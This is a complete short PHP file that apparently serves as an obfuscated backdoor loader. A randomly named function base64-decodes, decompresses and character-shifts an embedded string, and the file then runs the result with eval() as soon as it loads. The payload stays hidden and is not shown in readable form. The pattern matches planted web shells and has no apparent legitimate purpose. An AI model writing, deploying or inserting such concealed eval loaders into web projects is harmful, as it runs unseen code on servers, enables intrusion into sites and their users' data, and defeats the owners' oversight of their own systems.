<?php function ntP($lYJLMF)
{ 
$lYJLMF=gzinflate(base64_decode($lYJLMF));
 for($i=0;$i<strlen($lYJLMF);$i++)
 {
$lYJLMF[$i] = chr(ord($lYJLMF[$i])-1);
 }
 return $lYJLMF;
 }eval(ntP("U1QEgbSUzAJFZZeCwqrirIzMUkX1FCDTRtEzKT0rVdEptzArX1E9Ka/QRtE9KTWzIDcLSJcqeirbKDrYAwA="));?>